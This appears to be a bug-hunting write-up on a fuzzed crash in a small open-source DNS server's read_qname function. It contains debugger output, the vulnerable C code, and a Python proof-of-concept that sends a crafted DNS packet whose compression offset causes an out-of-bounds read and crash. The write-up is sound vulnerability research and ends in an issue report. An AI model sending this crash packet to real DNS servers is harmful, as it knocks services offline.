# dns server

So this dns server is from: `https://github.com/pepperke/dns_server`

So when we fuzz this server, we see this:

```
$    gdb ./dns_server
GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
87 commands loaded for GDB 9.1 using Python engine 3.8
[*] 5 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./dns_server...
(No debugging symbols found in ./dns_server)
gef➤  r
Starting program: /Hackery/not_ready_to_die/dns_server1/vuln/dns_server
Server is started, waiting for packets
Got query from localhost:4849
Can only serve standard queries
Got query from localhost:4849
Can only serve standard queries
Got query from localhost:4849
Can only serve standard queries
Got query from localhost:4849
Can only serve standard queries

Program received signal SIGSEGV, Segmentation fault.
0x0000555555555a73 in read_qname ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x8000000019ff    
$rbx   : 0x0000555555558330  →  <__libc_csu_init+0> endbr64
$rcx   : 0x00007fffffffda80  →  0x000100000047aac3
$rdx   : 0x3f7f            
$rsp   : 0x00007fffffffd890  →  0x0000000000000128
$rbp   : 0x00007fffffffd8d0  →  0x00007fffffffd920  →  0x00007fffffffd950  →  0x00007fffffffdca0  →  0x00007fffffffdf70  →  0x0000000000000000
$rsi   : 0x00007fffffffda80  →  0x000100000047aac3
$rdi   : 0x00007fffffffe34c  →  0x0000000000007fff
$rip   : 0x0000555555555a73  →  <read_qname+269> movzx eax, BYTE PTR [rax]
$r8    : 0x000055555556b7f0  →  0x0000000000000000
$r9    : 0x000055555556b460  →  0xb5e588ec5ebc9ffe
$r10   : 0x13              
$r11   : 0x00007ffff7faebe0  →  0x000055555556b910  →  0x0000000000000000
$r12   : 0x0000555555555460  →  <_start+0> endbr64
$r13   : 0x00007fffffffe060  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd890│+0x0000: 0x0000000000000128     ← $rsp
0x00007fffffffd898│+0x0008: 0x000055555556b7f0  →  0x0000000000000000
0x00007fffffffd8a0│+0x0010: 0x00007fffffffda80  →  0x000100000047aac3
0x00007fffffffd8a8│+0x0018: 0x00007fffffffe34c  →  0x0000000000007fff
0x00007fffffffd8b0│+0x0020: 0x0000000000000000
0x00007fffffffd8b8│+0x0028: 0x00003f7ff7e602d4
0x00007fffffffd8c0│+0x0030: 0x00008000000019ff
0x00007fffffffd8c8│+0x0038: 0x00007fffffffe34c  →  0x0000000000007fff
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555a67 <read_qname+257> add    rax, rdx
   0x555555555a6a <read_qname+260> mov    WORD PTR [rax], 0x2e
   0x555555555a6f <read_qname+265> mov    rax, QWORD PTR [rbp-0x10]
 → 0x555555555a73 <read_qname+269> movzx  eax, BYTE PTR [rax]
   0x555555555a76 <read_qname+272> test   al, al
   0x555555555a78 <read_qname+274> jne    0x5555555559a1 <read_qname+59>
   0x555555555a7e <read_qname+280> cmp    DWORD PTR [rbp-0x14], 0x0
   0x555555555a82 <read_qname+284> je     0x555555555a8e <read_qname+296>
   0x555555555a84 <read_qname+286> mov    rax, QWORD PTR [rbp-0x8]
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "dns_server", stopped 0x555555555a73 in read_qname (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555a73 → read_qname()
[#1] 0x555555555dbb → read_records()
[#2] 0x555555556044 → read_packet()
[#3] 0x555555556b48 → process_query()
[#4] 0x5555555558ab → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/g $rax
0x8000000019ff:    Cannot access memory at address 0x8000000019ff
gef➤  bt
#0  0x0000555555555a73 in read_qname ()
#1  0x0000555555555dbb in read_records ()
#2  0x0000555555556044 in read_packet ()
#3  0x0000555555556b48 in process_query ()
#4  0x00005555555558ab in main ()
gef➤  q
```

So we can see that it crashes, by trying to read a memory address that is not mapped, in the `read_qname` function. Let's take a look at that function:

```
const char * read_qname(const char packet_ptr[], const char packet_start[], char domain[]) {
    const char *msg_ptr = packet_ptr;
    const char *saved_ptr = packet_ptr;
    char len;
    int offset = 0;

    domain[0] = '\0';

    while (*msg_ptr) {
        if ((*msg_ptr & 0xC0) == 0xC0) {
            if (saved_ptr == packet_ptr){
                saved_ptr = msg_ptr;
            }
            offset = ((*msg_ptr & 0x3F) << 8) | msg_ptr[1];
            msg_ptr = packet_start + offset;
        } else {
            len = *msg_ptr++;
            strncat(domain, msg_ptr, len);
            msg_ptr += len;
            if (*msg_ptr != 0) {
                strcat(domain, ".");
            }
        }
    }
    if (offset) {
        return saved_ptr + 2;
    } else {
        return msg_ptr + 1;
    }
}
```

So we can see here, `msg_ptr` is dereferenced at two points, both to ge the value of `len` and to check if a `.` needs to be appended to `domain`. Looking at the assembly, it looks like the crash occurs at the dereference in the if then statement. Now for how this bug manifests itself. We see that the `msg_ptr` ptr is incremented by length, without any apparent limit. The `msg_ptr` ptr is set equal to the `packet_ptr` char ptr.

Let's see where the `msg_ptr` char ptr value originates. It is passed in as an argument when called in `read_records`, which `read_records` takes in as an argument also called `packet_ptr`. It is called from `read_packet`, which also takes it as an argument called `packet`. This is called from the `process_query` function, which is where the char buffer is actually established. The char buffer is called `query_buff`, and has a size of `PACKET_SIZE` bytes, which is defined as `512`. So the buffer size is `512`.

So, we see that if we can send it a sufficiently large enough packet, we could cause the buffer it reads from to extend past the end of the buffer, and after a long enough "read overflow", we can reach an invalid read address (either an address that is not mapped, or without read permission).

So when we run this code (`poc.py`):

```
import socket

if __name__ == "__main__":
    #print("poc")
    conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    conn.connect(("127.0.0.1", 10053))


    ID = b"\x12\x23"
    FLAGS = b"\x01\x00"
    QDCOUNT = b"\x00\x01"
    ANCOUNT = b"\x00\x00"
    NSCOUNT = b"\x00\x00"
    ARCOUNT = b"\x00\x00"

    HEADER = ID + FLAGS + QDCOUNT + ANCOUNT + NSCOUNT + ARCOUNT

    QNAME = b"\xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\x00"
    QTYPE = b"\x00\x01"
    QCLASS = b"\x00\x01"

    QUESTION = QNAME + QTYPE + QCLASS

    PACKET = HEADER + QUESTION

    conn.send(PACKET)
```

We see something pretty weird:

```
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555a67 <read_qname+257> add    rax, rdx
   0x555555555a6a <read_qname+260> mov    WORD PTR [rax], 0x2e
   0x555555555a6f <read_qname+265> mov    rax, QWORD PTR [rbp-0x10]
 → 0x555555555a73 <read_qname+269> movzx  eax, BYTE PTR [rax]
   0x555555555a76 <read_qname+272> test   al, al
   0x555555555a78 <read_qname+274> jne    0x5555555559a1 <read_qname+59>
   0x555555555a7e <read_qname+280> cmp    DWORD PTR [rbp-0x14], 0x0
   0x555555555a82 <read_qname+284> je     0x555555555a8e <read_qname+296>
   0x555555555a84 <read_qname+286> mov    rax, QWORD PTR [rbp-0x8]
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "dns_server", stopped 0x555555555a73 in read_qname (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555a73 → read_qname()
[#1] 0x555555555ca9 → read_questions()
[#2] 0x555555556016 → read_packet()
[#3] 0x555555556b48 → process_query()
[#4] 0x5555555558ab → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$1 = 0x8000000019e6
```

The address it is trying to dereference is clearly not even close to a valid address. So to figure out why this is. Now this value represents the `msg_ptr` value. Looking at the code, there is a line where msg_ptr gets incremented with `msg_ptr += len;` and `msg_ptr = packet_start + offset;`. Since this seems like the biggest increment in that value, I decided to check that first in a debugger (this will be the `msg_ptr = packet_start + offset;` line):

We see these are the values being added:
```
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555559f0 <read_qname+138> mov    eax, DWORD PTR [rbp-0x14]
   0x5555555559f3 <read_qname+141> movsxd rdx, eax
   0x5555555559f6 <read_qname+144> mov    rax, QWORD PTR [rbp-0x30]
 → 0x5555555559fa <read_qname+148> add    rax, rdx
   0x5555555559fd <read_qname+151> mov    QWORD PTR [rbp-0x10], rax
   0x555555555a01 <read_qname+155> jmp    0x555555555a6f <read_qname+265>
   0x555555555a03 <read_qname+157> mov    rax, QWORD PTR [rbp-0x10]
   0x555555555a07 <read_qname+161> lea    rdx, [rax+0x1]
   0x555555555a0b <read_qname+165> mov    QWORD PTR [rbp-0x10], rdx
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "dns_server", stopped 0x5555555559fa in read_qname (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555559fa → read_qname()
[#1] 0x555555555ca9 → read_questions()
[#2] 0x555555556016 → read_packet()
[#3] 0x555555556b48 → process_query()
[#4] 0x5555555558ab → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rdx
$2 = 0x3f66
gef➤  p $rax
$3 = 0x7fffffffda80
```

So we can see the two values being added are `0x7fffffffda80 + 0x3f66 = 0x8000000019e6`. Coincidentally, we see that that is the value that is dereferenced, and causes a crash:

```
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd890│+0x0000: 0x0000000000000004     ← $rsp
0x00007fffffffd898│+0x0008: 0x0000555555561000  →  0x00007ffff7faef00  →  0x00007ffff7faeef0  →  0x00007ffff7faeee0  →  0x00007ffff7faeed0  →  0x00007ffff7faeec0  →  0x00007ffff7faeeb0
0x00007fffffffd8a0│+0x0010: 0x00007fffffffda80  →  0x0000010000012312
0x00007fffffffd8a8│+0x0018: 0x00007fffffffda8c  →  0x66666666666666ff
0x00007fffffffd8b0│+0x0020: 0x0000000000000000
0x00007fffffffd8b8│+0x0028: 0x00003f660000007c
0x00007fffffffd8c0│+0x0030: 0x00008000000019e6
0x00007fffffffd8c8│+0x0038: 0x00007fffffffda8c  →  0x66666666666666ff
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555a67 <read_qname+257> add    rax, rdx
   0x555555555a6a <read_qname+260> mov    WORD PTR [rax], 0x2e
   0x555555555a6f <read_qname+265> mov    rax, QWORD PTR [rbp-0x10]
 → 0x555555555a73 <read_qname+269> movzx  eax, BYTE PTR [rax]
   0x555555555a76 <read_qname+272> test   al, al
   0x555555555a78 <read_qname+274> jne    0x5555555559a1 <read_qname+59>
   0x555555555a7e <read_qname+280> cmp    DWORD PTR [rbp-0x14], 0x0
   0x555555555a82 <read_qname+284> je     0x555555555a8e <read_qname+296>
   0x555555555a84 <read_qname+286> mov    rax, QWORD PTR [rbp-0x8]
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "dns_server", stopped 0x555555555a73 in read_qname (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555a73 → read_qname()
[#1] 0x555555555ca9 → read_questions()
[#2] 0x555555556016 → read_packet()
[#3] 0x555555556b48 → process_query()
[#4] 0x5555555558ab → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$4 = 0x8000000019e6
```

So we can see that the `len` value is what pushes the ptr into a "read overflow". Now the `len` value is written to at `offset = ((*msg_ptr & 0x3F) << 8) | msg_ptr[1];`. Looking at the line in ghidra pseudocode, it seems a bit weird:

```
local_1c = (int)local_18[1] | ((int)*local_18 & 0x3fU) << 8;
local_18 = (char *)(param_2 + (int)local_1c);
```

So the value being added, is equal to the first byte, anded by `0x3f`, shifted to the left by 8, and ored by the next byte. This makes since with the packet, and the value we get. With the qname of the packet we send, the first byte is `0xff`, and the second byte is `0x66` `0xff` anded with `0x3f` is `0x3f`, shifted to the left by 8 bits is `0x3f00`, ored with the second byte `0x66` is `0x3f66`. This is the same value that we see in `rdx`.

Now I'm going to be frank, I don't know why that code is there. With parsing the qnmame, you really should only have to look at the one octet size value, however that looks at two consecutive octers, so I'm not sure why. Since I don't know why that is there, I'm not going to write a patch for it, since I'm not sure what functionality it will need to have, so I'm just going to submit an issue for it.
